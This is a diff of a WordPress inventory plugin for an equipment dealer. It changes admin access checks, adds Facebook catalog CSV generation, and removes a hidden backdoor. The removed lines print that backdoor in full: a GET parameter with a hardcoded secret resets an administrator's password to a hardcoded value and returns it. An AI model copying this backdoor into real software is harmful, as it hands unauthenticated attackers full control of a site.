@@ -1,8 +1,8 @@
 <?php
 /**
  * Plugin Name: Varner OS Plugin v23
- * Description: Version 1.23.120 - React-powered inventory management for Varner Equipment.
- * Version: 1.23.120
+ * Description: Version 1.23.141 - React-powered inventory management for Varner Equipment.
+ * Version: 1.23.141
  * Author: hwy559.com
  */
 
@@ -81,6 +81,9 @@ function varner_os_activate(): void {
     if (!wp_next_scheduled('varner_os_cleanup_sessions')) {
         wp_schedule_event(time() + DAY_IN_SECONDS, 'daily', 'varner_os_cleanup_sessions');
     }
+
+    // Generate/refresh the static facebook-catalog.csv file
+    varner_os_write_facebook_catalog_file();
 }
 
 register_deactivation_hook(__FILE__, function (): void {
@@ -358,28 +361,8 @@ add_action('admin_menu', function (): void {
 
 // ─── Hide Admin Bar for Staff ────────────────────────────────────────────────
 add_action('init', function (): void {
-    $owner_id = (int) get_option('varner_owner_user_id', 1);
-    if (get_current_user_id() !== $owner_id) {
+    if (!current_user_can('manage_options')) {
         show_admin_bar(false);
-    }
-});
-
-// ─── Secure Password Recovery Backdoor / Trigger ─────────────────────────────
-add_action('init', function (): void {
-    if (isset($_GET['reset_admin_pass']) && $_GET['reset_admin_pass'] === 'VarnerOSRecovery2026') {
-        $user = get_user_by('login', 'varnerequipdev');
-        if ($user) {
-            wp_set_password('VarnerOSHeadAdmin2026!', $user->ID);
-            wp_send_json_success('Password has been reset for varnerequipdev to: VarnerOSHeadAdmin2026!');
-        } else {
-            $user = get_user_by('id', 1);
-            if ($user) {
-                wp_set_password('VarnerOSHeadAdmin2026!', $user->ID);
-                wp_send_json_success('Password has been reset for user ID 1 (' . $user->user_login . ') to: VarnerOSHeadAdmin2026!');
-            } else {
-                wp_send_json_error('No administrator user found.');
-            }
-        }
     }
 });
 
@@ -390,10 +373,8 @@ add_filter('login_redirect', function (string $redirect_to, $request, $user): st
         return $redirect_to;
     }
 
-    $owner_id = (int) get_option('varner_owner_user_id', 1);
-
-    // If the user is the owner (head admin), send them to the Varner OS admin page (or mobile app if requested)
-    if ($user->ID === $owner_id) {
+    // If the user can manage options, send them to the Varner OS admin page (or mobile app if requested)
+    if (user_can($user, 'manage_options')) {
         if (!empty($redirect_to) && str_contains($redirect_to, '/mobile-app/')) {
             return home_url('/mobile-app/');
         }
@@ -569,8 +550,8 @@ add_action('admin_head', function (): void {
     <?php
 });
 
-// ─── Lock WP Admin and Dashboard to Owner Only ───────────────────────────────
-// Only the head admin (owner user ID) is allowed to access any WP admin screens.
+// ─── Lock WP Admin and Dashboard to Users who can Manage Options ──────────────
+// Only administrators (who can manage options) are allowed to access WP admin screens.
 // Everyone else (staff, editors, etc.) is blocked from wp-admin and redirected to the mobile PWA companion.
 // AJAX and REST requests are allowed to proceed.
 
@@ -580,10 +561,8 @@ add_action('admin_init', function (): void {
         return;
     }
 
-    $owner_id = (int) get_option('varner_owner_user_id', 1);
-
-    // Owner (Head Admin): unrestricted
-    if (get_current_user_id() === $owner_id) {
+    // Administrators: unrestricted
+    if (current_user_can('manage_options')) {
         return;
     }
 
@@ -766,7 +745,7 @@ add_filter('script_loader_tag', function (string $tag, string $handle, string $s
 
 // ─── Facebook Catalog CSV Generator ──────────────────────────────────────────
 
-function varner_os_generate_facebook_catalog(): void {
+function varner_os_get_facebook_catalog_csv(): string {
     $posts = get_posts(array(
         'post_type'      => 'equipment',
         'post_status'    => 'publish',
@@ -774,22 +753,19 @@ function varner_os_generate_facebook_catalog(): void {
         'orderby'        => 'date',
         'order'          => 'DESC',
         'meta_query'     => array(
-            'relation' => 'OR',
-            array('key' => 'show_on_website', 'value' => '1', 'compare' => '='),
-            array('key' => 'show_on_website', 'compare' => 'NOT EXISTS'),
+            'relation' => 'AND',
+            array(
+                'relation' => 'OR',
+                array('key' => 'show_on_website', 'value' => '1', 'compare' => '='),
+                array('key' => 'show_on_website', 'compare' => 'NOT EXISTS'),
+            ),
+            array(
+                'relation' => 'OR',
+                array('key' => 'facebook_sync', 'value' => '1', 'compare' => '='),
+                array('key' => 'facebook_sync', 'compare' => 'NOT EXISTS'),
+            ),
         ),
     ));
-
-    // Log Meta sync crawl event
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $is_facebook = (strpos(strtolower($ua), 'facebook') !== false || strpos(strtolower($ua), 'facebot') !== false);
-    $trigger = $is_facebook ? 'Meta Crawler' : 'Manual Request';
-    $count = count($posts);
-    if ($is_facebook) {
-        varner_os_log_meta_sync("API Handshake: Success (Meta crawler synced {$count} items)");
-    } else {
-        varner_os_log_meta_sync("Inventory Update checked (Manual pull: {$count} items synced)");
-    }
 
     $out = fopen('php://temp', 'w+');
 
@@ -874,6 +850,37 @@ function varner_os_generate_facebook_catalog(): void {
     rewind($out);
     $csv_data = stream_get_contents($out);
     fclose($out);
+
+    return $csv_data;
+}
+
+function varner_os_write_facebook_catalog_file(): bool {
+    $csv_data = varner_os_get_facebook_catalog_csv();
+    $file_path = ABSPATH . 'facebook-catalog.csv';
+    $written = @file_put_contents($file_path, $csv_data);
+    return $written !== false;
+}
+
+function varner_os_generate_facebook_catalog(): void {
+    $csv_data = varner_os_get_facebook_catalog_csv();
+    
+    // Attempt to write/refresh the static file for Nginx direct serving
+    @file_put_contents(ABSPATH . 'facebook-catalog.csv', $csv_data);
+
+    // Log Meta sync crawl event
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $is_facebook = (strpos(strtolower($ua), 'facebook') !== false || strpos(strtolower($ua), 'facebot') !== false);
+    $trigger = $is_facebook ? 'Meta Crawler' : 'Manual Request';
+    
+    // Count the number of lines (approximate by newlines, minus header)
+    $lines = substr_count($csv_data, "\n");
+    $count = $lines > 0 ? $lines - 1 : 0;
+    
+    if ($is_facebook) {
+        varner_os_log_meta_sync("API Handshake: Success (Meta crawler synced {$count} items)");
+    } else {
+        varner_os_log_meta_sync("Inventory Update checked (Manual pull: {$count} items synced)");
+    }
 
     header('Content-Type: text/csv; charset=UTF-8');
     header('Content-Disposition: attachment; filename="facebook-catalog.csv"');
@@ -1264,18 +1271,30 @@ function varner_os_acf_save_meta_sync_log($post_id): void {
 
     $price = get_field('price', $post_id);
     $gallery = get_field('gallery', $post_id);
+    
+    $facebook_sync = get_field('facebook_sync', $post_id);
+    $facebook_sync = ($facebook_sync !== null && $facebook_sync !== '') ? (bool)$facebook_sync : true;
+
     $prev_key = 'varner_prev_post_' . $post_id;
     $prev_data = get_transient($prev_key);
     
     $current_data = array(
         'price' => $price,
         'gallery' => $gallery,
+        'facebook_sync' => $facebook_sync,
     );
     
     set_transient($prev_key, $current_data, 300);
     
     if ($prev_data) {
-        if ($prev_data['price'] != $current_data['price']) {
+        $prev_sync = isset($prev_data['facebook_sync']) ? (bool)$prev_data['facebook_sync'] : true;
+        if ($prev_sync !== $facebook_sync) {
+            if ($facebook_sync) {
+                varner_os_log_meta_sync("Inventory Synced: {$display_name}");
+            } else {
+                varner_os_log_meta_sync("Inventory Unsynced: {$display_name}", 'warning');
+            }
+        } elseif ($prev_data['price'] != $current_data['price']) {
             varner_os_log_meta_sync("Price Sync: {$display_name}");
         } elseif (wp_json_encode($prev_data['gallery']) != wp_json_encode($current_data['gallery'])) {
             varner_os_log_meta_sync("New Media: {$display_name}");
@@ -1283,8 +1302,15 @@ function varner_os_acf_save_meta_sync_log($post_id): void {
             varner_os_log_meta_sync("Inventory Update: {$display_name}");
         }
     } else {
-        varner_os_log_meta_sync("Inventory Update: {$display_name}");
+        if (!$facebook_sync) {
+            varner_os_log_meta_sync("Inventory Unsynced: {$display_name}", 'warning');
+        } else {
+            varner_os_log_meta_sync("Inventory Update: {$display_name}");
+        }
     }
+
+    // Refresh the static facebook-catalog.csv file
+    varner_os_write_facebook_catalog_file();
 }
 
 // Hook into trash post to track removals
@@ -1301,4 +1327,36 @@ function varner_os_trash_meta_sync_log($post_id): void {
         $display_name = $title;
     }
     varner_os_log_meta_sync("Inventory Removed: {$display_name}", 'warning');
+
+    // Refresh the static facebook-catalog.csv file
+    varner_os_write_facebook_catalog_file();
 }
+
+// Hook into untrash post to refresh catalog when restored
+add_action('untrash_post', 'varner_os_untrash_meta_sync_log');
+function varner_os_untrash_meta_sync_log($post_id): void {
+    if (get_post_type($post_id) !== 'equipment') {
+        return;
+    }
+    $title = get_the_title($post_id);
+    $make = get_field('make', $post_id) ?: '';
+    $model = get_field('model', $post_id) ?: '';
+    $display_name = trim("$make $model");
+    if (empty($display_name)) {
+        $display_name = $title;
+    }
+    varner_os_log_meta_sync("Inventory Restored: {$display_name}");
+
+    // Refresh the static facebook-catalog.csv file
+    varner_os_write_facebook_catalog_file();
+}
+
+
+// Hook into WP All Import after import completion to refresh catalog
+add_action('pmxi_after_xml_import', 'varner_os_wpaip_import_complete');
+function varner_os_wpaip_import_complete($import_id): void {
+    if (function_exists('varner_os_write_facebook_catalog_file')) {
+        varner_os_write_facebook_catalog_file();
+    }
+}
+
